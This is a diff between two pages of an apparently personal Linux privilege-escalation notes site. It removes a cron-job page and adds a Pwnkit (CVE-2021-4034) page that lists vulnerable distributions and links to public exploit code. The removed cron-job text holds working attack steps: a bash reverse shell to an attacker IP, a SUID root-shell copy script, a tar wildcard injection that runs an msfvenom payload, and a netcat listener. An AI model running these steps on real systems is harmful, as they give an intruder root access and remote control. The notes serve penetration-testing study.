@@ -9,21 +9,21 @@
     <meta name="generator" content="Retype 2.0">
 
     <!-- Primary Meta Tags -->
-    <title>Cronjobs</title>
-    <meta name="title" content="Cronjobs">
-    <meta name="description" content="Cron table files (crontabs) store the configuration for cron jobs." />
+    <title>Pwnkit</title>
+    <meta name="title" content="Pwnkit">
+    <meta name="description" content="Distribution" />
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://caueb.github.io/linuxprivesc/cronjobsdc94e/">
-    <meta property="og:title" content="Cronjobs">
-    <meta property="og:description" content="Cron table files (crontabs) store the configuration for cron jobs.">
+    <meta property="og:url" content="https://caueb.github.io/linuxprivesc/pwnkit/">
+    <meta property="og:title" content="Pwnkit">
+    <meta property="og:description" content="Distribution">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://caueb.github.io/linuxprivesc/cronjobsdc94e/">
-    <meta property="twitter:title" content="Cronjobs">
-    <meta property="twitter:description" content="Cron table files (crontabs) store the configuration for cron jobs.">
+    <meta property="twitter:url" content="https://caueb.github.io/linuxprivesc/pwnkit/">
+    <meta property="twitter:title" content="Pwnkit">
+    <meta property="twitter:description" content="Distribution">
 
     <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
@@ -32,7 +32,6 @@
     <script type="text/javascript" src="/resources/js/config.js?v=2.0.701150333476" defer data-turbo-track="reload"></script>
     <script type="text/javascript" src="/resources/js/retype.js?v=2.0" defer data-turbo-track="reload"></script>
     <script id="lunr-js" type="text/javascript" src="/resources/js/lunr.js?v=2.0.701150333476" defer></script>
-    <script id="prism-js" type="text/javascript" src="/resources/js/prism.js?v=2.0.701150333476" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -169,111 +168,88 @@
                                 <div id="docs-sidebar-right-toggle"></div>
                 
                                 <!-- Page content  -->
-<doc-anchor-target id="cronjobs" class="break-words">
+<doc-anchor-target id="pwnkit" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#cronjobs">#</doc-anchor-trigger>
-        <span>Cronjobs</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#pwnkit">#</doc-anchor-trigger>
+        <span>Pwnkit</span>
     </h1>
 </doc-anchor-target>
-<p>Cron table files (crontabs) store the configuration for cron jobs.</p>
-<doc-anchor-target id="location">
+<doc-anchor-target id="linux-distributions">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#location">#</doc-anchor-trigger>
-        <span>Location</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#linux-distributions">#</doc-anchor-trigger>
+        <span>Linux distributions</span>
     </h2>
 </doc-anchor-target>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">User crontabs are usually located at
-/var/spool/cron/
-or
-/var/spool/cron/crontabs/
-
-System-wide crontab is located at
-/etc/crontab</code></pre>
-</doc-codeblock></div>
-<p>Example:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">cat /etc/crontab
-...
-* * * * * root overwrite.sh
-* * * * * root /usr/local/bin/compress.sh</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="file-permission">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#file-permission">#</doc-anchor-trigger>
-        <span>File Permission</span>
-    </h2>
-</doc-anchor-target>
-<p>Cronjobs that run as root and we can write to that directory?</p>
-<p>Add a bash reverse shell in the file:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">#!/bin/bash
-bash -i &gt;&amp; /dev/tcp/192.168.1.26/53 0&gt;&amp;1</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="path-environment-variable">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#path-environment-variable">#</doc-anchor-trigger>
-        <span>PATH Environment Variable</span>
-    </h2>
-</doc-anchor-target>
-<p>The crontab PATH environment variable is by default set to <code v-pre>/usr/bin:/bin</code></p>
-<p>If a program/script does not use absolute path create a script with the same name as the cronjob in the first directory the path look for the files.</p>
-<p>Example: <code v-pre>PATH=/home/user/:/usr/local/sbin:/bin</code></p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Distribution</th>
+<th>Vulnerable?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>RHEL 7</td>
+<td>No</td>
+</tr>
+<tr>
+<td>RHEL 8</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Fedora 20 (or earlier)</td>
+<td>No</td>
+</tr>
+<tr>
+<td>Fedora 21 (or later)</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Debian 10 (“buster”)</td>
+<td>No</td>
+</tr>
+<tr>
+<td>Debian testing (“bullseye”)</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Ubuntu 18.04</td>
+<td>No</td>
+</tr>
+<tr>
+<td>Ubuntu 20.04</td>
+<td>Yes</td>
+</tr>
+</tbody>
+</table>
+</div>
 <doc-anchor-target id="exploit">
-    <h3>
+    <h2>
         <doc-anchor-trigger class="header-anchor-trigger" to="#exploit">#</doc-anchor-trigger>
         <span>Exploit</span>
-    </h3>
-</doc-anchor-target>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">#!/bin/bash
-cp /bin/bash /tmp/rootbash
-chmod +s /tmp/rootbash</code></pre>
-</doc-codeblock></div>
-<p>Make sure the script is executable:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">chmod +x overwrite.sh</code></pre>
-</doc-codeblock></div>
-<p>Wait for the cronjob, get a root shell:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">/tmp/rootbash -p</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="wildcards">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#wildcards">#</doc-anchor-trigger>
-        <span>Wildcards</span>
     </h2>
 </doc-anchor-target>
-<p>Abusing TAR arguments.</p>
-<p>Cronjob file:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">#!/bin/sh
-cd /home/user
-tar czf /tmp/backup.tar.gz *</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="exploit-1">
+<doc-anchor-target id="compiling">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#exploit-1">#</doc-anchor-trigger>
-        <span>Exploit</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#compiling">#</doc-anchor-trigger>
+        <span>Compiling</span>
     </h3>
 </doc-anchor-target>
-<p>Generate a reverse shell using msvenom:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.x LPORT=1234 -f elf -o shell.elf</code></pre>
-</doc-codeblock></div>
-<p>Copy the file to the /home/user directory and make it executable:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">chmod +x /home/user/shell.elf</code></pre>
-</doc-codeblock></div>
-<p>Create two files in the /home/user directory:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">touch /home/user/--checkpoint=1 
-touch /home/user/--checkpoint-action=exec=shell.elf</code></pre>
-</doc-codeblock></div>
-<p>Start a netcat listener and wait for the cronjob:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">nc -lnvp 1234</code></pre>
-</doc-codeblock></div>
+<ul>
+<li><a href="https://github.com/ly4k/PwnKit">https://github.com/ly4k/PwnKit</a></li>
+<li><a href="https://github.com/arthepsy/CVE-2021-4034">https://github.com/arthepsy/CVE-2021-4034</a></li>
+</ul>
+<doc-anchor-target id="in-python">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#in-python">#</doc-anchor-trigger>
+        <span>In Python</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><a href="https://github.com/ravindubw/CVE-2021-4034">https://github.com/ravindubw/CVE-2021-4034</a></li>
+<li><a href="https://github.com/joeammond/CVE-2021-4034">https://github.com/joeammond/CVE-2021-4034</a></li>
+</ul>
 
                                 
                                 <!-- Required only on API pages -->
@@ -283,20 +259,20 @@ touch /home/user/--checkpoint-action=exec=shell.elf</code></pre>
                             
                                 <nav class="flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="/linuxprivesc/bigchecklf4926/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="/linuxprivesc/portforwac97d0/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
                                                 <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
-                                                <span class="block mt-1">Big Checklist</span>
+                                                <span class="block mt-1">Port Forwarding - SSH</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="/linuxprivesc/dirtypipe/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="/linuxprivesc/ssh6b716/">
                                             <span>
                                                 <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
-                                                <span class="block mt-1">Dirty Pipe</span>
+                                                <span class="block mt-1">SSH</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                         </a>
@@ -340,6 +316,6 @@ touch /home/user/--checkpoint-action=exec=shell.elf</code></pre>
 
     <div id="docs-overlay-target"></div>
 
-    <script>window.__DOCS__ = { "title": "Cronjobs", icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
+    <script>window.__DOCS__ = { "title": "Pwnkit", icon: "file", hasPrism: false, hasMermaid: false, hasMath: false }</script>
 </body>
 </html>
